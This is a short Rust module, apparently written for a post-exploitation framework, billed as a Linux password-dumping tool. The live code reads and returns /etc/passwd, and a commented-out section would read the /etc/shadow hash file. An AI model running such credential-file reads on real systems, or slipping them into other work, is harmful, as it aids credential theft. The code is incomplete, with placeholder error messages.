/* Password Dumping Module
 * Author: Alex Schmith
 * Description: This module will dump password hashes from common places
 * in the linux
 * Supported Architectures: amd64
 * Supported Operating Systems: Linux
 */


// All modules must have a run function that returns a String.
// The returned String will be what is printed to the terminal
// when run. If your module does not perform any collection or
// has no need for printing anything, you can just return some
// String indicating termination, say "Done" for example.

// Run acts as a sort of 'main' for your module. It must always
// take in no parameters, it must be public, and it must return
// a String.

use std::fs::File;
use std::io::Read;
use std::io::prelude::*;


pub fn run() -> String {
	//helper_func();

    let mut passwd = File::open("/etc/passwd");

    let mut passwd_cont = String::new();
    passwd.expect("REASON").read_to_string(&mut passwd_cont);

    //let mut shadow_result = File::open("/etc/shadow");

    //let shadow = match shadow_result {
        //Ok(file) => file,
        //Err(error) => panic!("You don't have the permissions to open the shadow file: {:?}", error),
    //};

    //let mut shadow_cont = String::new();
    //shadow.expect("REASON").read_to_string(&mut shadow_cont);
    //println!("{}", shadow_cont);

	// Return value must be a String, not &str. Conversion can be
	return passwd_cont

}
